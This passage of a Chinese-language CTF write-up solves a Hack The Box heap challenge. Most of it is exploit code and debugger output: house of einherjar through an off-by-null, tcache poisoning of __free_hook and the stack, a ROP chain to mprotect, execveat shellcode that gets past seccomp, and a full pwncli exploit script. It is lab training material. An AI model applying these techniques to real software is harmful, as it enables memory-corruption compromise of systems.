0x560445b62ee0  0x0000000000000000      0x0000000000000000      ................
0x560445b62ef0  0x0000000000000000      0x0000000000000000      ................
0x560445b62f00  0x0000000000000000      0x0000000000000000      ................
0x560445b62f10  0x0000000000000000      0x0000000000000000      ................
0x560445b62f20  0x0000000000000000      0x0000000000000081      ................         <-- unsortedbin[all][0]

0x560445b62f30  0x00007fc8df5b3ca0      0x00007fc8df5b3ca0      .<[......<[.....
0x560445b62f40  0x0000000000000000      0x0000000000000000      ................
0x560445b62f50  0x0000000000000000      0x0000000000000000      ................
0x560445b62f60  0x0000000000000000      0x0000000000000000      ................
0x560445b62f70  0x0000000000000000      0x0000000000000000      ................
0x560445b62f80  0x0000000000000000      0x0000000000000000      ................
0x560445b62f90  0x0000000000000000      0x0000000000000000      ................

0x560445b62fa0  0x0000000000000080      0x0000000000000030      ........0.......
0x560445b62fb0  0x0000000000000a39      0x0000000000000000      9...............
0x560445b62fc0  0x0000000000000000      0x0000000000000000      ................

0x560445b62fd0  0x0000000000000000      0x000000000001f031      ........1.......         <-- Top chunk
```

开始写代码：

```
"""
5. tcache dup with stack
"""
target_addr = stack_leak + 0x5a7
success(f"target_addr: {hex(target_addr)}")
add(0xe8,pack(0)*7 + pack(0x131) + pack(target_addr))   #0
add(0x128,b'')  # 2
add(0x128,pack(0xdeadbeef)) # 3
quit()
```

此时 0xdeadbeef 成功写入：

```
*RAX  0
*RBX  0
*RCX  0
*RDX  0x565070257184 ◂— 0xfffff237fffff270
 RDI  0
*RSI  0
*R8   0x7ffd99c76921 ◂— 0x2800007fb0fde500
*R9   0
*R10  0x7fb0fde3aae0 ◂— 0x100000000
*R11  0x7fb0fde3b3e0 ◂— 0x2000200020002
*R12  0x565070256130 ◂— xor ebp, ebp
*R13  0x7ffd99c76f70 ◂— 1
*R14  0
*R15  0
*RBP  0x5650702569a0 ◂— push r15
*RSP  0x7ffd99c76ea0 ◂— 0xa /* '
' */
*RIP  0xdeadbeef
───────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────
Invalid address 0xdeadbeef
```

这里第一次申请的0x128字节的内存可用于写shellcode

### ROP -> mprotect

```
"""
6. ROP to mprotect
"""
rop = ROP(libc)
rop.mprotect(heap_base,0x3000,7)
rop.raw(heap_base+0xe00)

"""
5. tcache dup with stack
"""
target_addr = stack_leak + 0x5a7
success(f"target_addr: {hex(target_addr)}")
add(0xe8,pack(0)*7 + pack(0x131) + pack(target_addr))   #0
add(0x128,b'\xcc\xcc\x90\x90')  # 2
add(0x128,rop.chain()) # 3
quit()
```

直接用ROP去写就行，找到刚刚用于写入shellcode的chunk的地址，直接跳转过去

这里写入特征\xcc\xcc\x90\x90辅助定位，运行如果卡住看到如此特征，说明运行正确：

```
───────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────
 ► 0x559f2c362e01    int3
   0x559f2c362e02    nop
   0x559f2c362e03    nop
   0x559f2c362e04    or     bh, byte ptr [rdi]
   0x559f2c362e07    add    byte ptr [rax], al
   0x559f2c362e09    add    byte ptr [rax], al
```

### shellcode bypass Seccomp Sandbox

```
    .intel_syntax noprefix
    .text
    .globl  _start
    .type   _start, @function

_start:
    xor rsi, rsi
    push rsi                   
    mov rdi, 0x68732f6e69622f  
    push rdi
    mov rsi, rsp               

    push -100                  
    pop rdi                    
    xor rdx, rdx               
    xor r10, r10               
    xor r8, r8                 

    mov rax, 322               
    syscall
```

手写汇编shellcode，执行`execveat(-100, "/bin/sh\\x00\")`​系统调用

`-100`​意味着是当前目录

编译得到shellcode，写入刚刚的堆中：

```
"""
6. ROP to mprotect
"""
rop = ROP(libc)
rop.mprotect(heap_base,0x3000,7)
rop.raw(heap_base+0xe00)


"""
7. shellcode
"""
shellcode = asm("""    
    xor rsi, rsi
    push rsi                   
    mov rdi, 0x68732f6e69622f  
    push rdi
    mov rsi, rsp               

    push -100                  
    pop rdi                    
    xor rdx, rdx               
    xor r10, r10               
    xor r8, r8                 

    mov rax, 322               
    syscall
""")

"""
5. tcache dup with stack
"""
target_addr = stack_leak + 0x5a7
success(f"target_addr: {hex(target_addr)}")
add(0xe8,pack(0)*7 + pack(0x131) + pack(target_addr))   #0
add(0x128,shellcode)  # 2
add(0x128,rop.chain()) # 3
quit()
```

此时，已经拿到shell了，但是大部分命令都是execve系统调用来执行的接下来得想办法用其他命令来读取文件

### execve 前置基础

`execve`​系统调用的核心作用是加载并运行一个新的程序，用新的程序完全替换当前进程的内存空间、数据、和代码段。当执行像`ls`​, `grep`​, `find`​这类外部命令时，Shell会先`fork`​一个子进程，然后在这个子进程里调用`execve`​来执行`/bin/ls`​、`/bin/grep`​这些可执行文件。

而Shell内置命令，顾名思义，是**Shell自己内部实现的功能**，它不需要创建新进程，也不需要调用`execve`​，而是直接在当前Shell进程的上下文中执行。这样做效率更高，并且可以用来改变当前Shell自身的状态（比如环境变量、当前目录等）。

其中题目有关的常见内部命令有`cd`​，`pwd`​，`echo`​和`read`​

### shell bypass Seccomp Sandbox

接下来需要做2件事，获取flag所在文件名，读取该文件

无execve小技巧：

1. 通过`echo *`​命令，可以得到当前目录下的所有文件
2. 通过`read line < flag; echo $line`​命令，可以读取文件的内容

在拿到的shell中执行该命令即可：

```
[*] Switching to interactive mode
$ read line < flag.txt; echo $line
[DEBUG] Sent 0x21 bytes:
    b'read line < flag.txt; echo $line
'
[DEBUG] Received 0x10 bytes:
    b'flag{fake flag}
'
flag{fake flag}
```

因为环境在本地，所以是flag.txt，远程环境使用了一个很难猜到的名称：`cant_guess_me_f14G.txt`​，所以通过shellcode使用openat+sendfile的方案行不通

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()
set_remote_libc('libc.so.6')
#context.log_level = 'info'
io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(i, prompt=b"> "):
    sla(prompt, i)

def add(size:int, content:bytes):
    cmd('1')
    sla(b"size:",str(size).encode())
    sla(b"data:",content)
    
    #......

def edit(idx:int,content:bytes):
    cmd('2')
    sla(b"index:",str(idx).encode())
    sla(b"data:",content)
    #......

def dele(idx:int):
    cmd('3')
    sla(b"index:",str(idx).encode())

    #......

def show(idx:int):
    cmd('4')
    sla(b"index:",str(idx).encode())
    #......

def quit():
    cmd('5')
    #......

"""
1. get heap leak
"""
add(0x18, b"leak")
add(0x18, b"leak2")
dele(0)
dele(1)
add(0x18, b"")
show(0)

ru(b"data:")
rl()
heap_leak = rl()[:-1]
heap_leak = unpack(heap_leak, "all")
heap_base = heap_leak >> 4 << 12
success(f"heap_base: {hex(heap_base)}")

"""
2. offbynull: house of einherjar 
"""
# 清空已用指针，后续操作继续从0开始计算
dele(0) 

for i in range(0,7):
    add(0xf8,str(i).encode())
add(0xe8,b"7")
add(0xf8,b"8")
add(0x28,b"9")
# 将chunk8的size末尾1抹去
dele(7)
add(0xe8,b"7"*0xe8)
edit(7  ,b"7"*0xe8)

# 伪造unsortedbin chunk
dele(7)
add(0xe8,pack(0) + pack(0xe1) + pack(heap_base + 0xdc0)*2 + pack(0)*24+pack(0xe0))
# 填满tcache bin
for i in range(7):
    dele(i)
# house of einherjar!! get overlapping chunk

dele(8)

"""
3. libc address leak
"""
dele(7)
add(0xe8,cyclic(0xf))
show(0)
ru(b"data:")
rl()

libc_leak = rl()[:-1]
libc_leak = unpack(libc_leak, "all")
libc.address = libc_leak  -0x1e4ca0
success(f"heap_base: {hex(heap_base)}")
success(f"libc.address: {hex(libc.address)}")
# 还原unsortedbin chunk的header
dele(0)
add(0xe8,pack(0)+pack(0x1e1) + pack(libc_leak)*2)
"""
4. tcache dup with __free_hook -> printf
"""
# 获取重叠块 2个
add(0x28,b"1")  # 打 free hook
add(0x128,b"2") # 打 stack
dele(1) 
dele(2)
# overwrite tcachebin chunk 1's next ptr
dele(0)
add(0xe8,pack(0)+pack(0x31)+pack(libc.sym.__free_hook))
# 之后没有free了，提前free掉先
dele(0)
# 准备格式化字符串
add(0x28,b"%p
"*5) # 0
# 覆盖free hook
add(0x28,pack(libc.sym.printf))
# 泄露栈地址
dele(0) # printf
rl()
rl()
rl()
stack_leak = rl()
stack_leak = int(stack_leak,16)
success(f"stack_leak: {hex(stack_leak)}")


"""
6. ROP to mprotect
"""
rop = ROP(libc)
rop.mprotect(heap_base,0x3000,7)
rop.raw(heap_base+0xe00)


"""
7. shellcode
"""
shellcode = asm("""    
    xor rsi, rsi
    push rsi                   
    mov rdi, 0x68732f6e69622f  
    push rdi
    mov rsi, rsp               

    push -100                  
    pop rdi                    
    xor rdx, rdx               
    xor r10, r10               
    xor r8, r8                 

    mov rax, 322               
    syscall
""")

"""
5. tcache dup with stack
"""
target_addr = stack_leak + 0x5a7
success(f"target_addr: {hex(target_addr)}")
add(0xe8,pack(0)*7 + pack(0x131) + pack(target_addr))   #0
add(0x128,shellcode)  # 2
add(0x128,rop.chain()) # 3
quit()

ia()
```

## 总结

千言万语汇成一句话：精彩！

## 参考资料

* [0] [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/Dream%2520Diary%253A%2520Chapter%25203)
* [1] [Glibc堆利用之house Of系列总结 | roderick - record and learn!](https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/)
* [2] glibc malloc.c 源码

‍
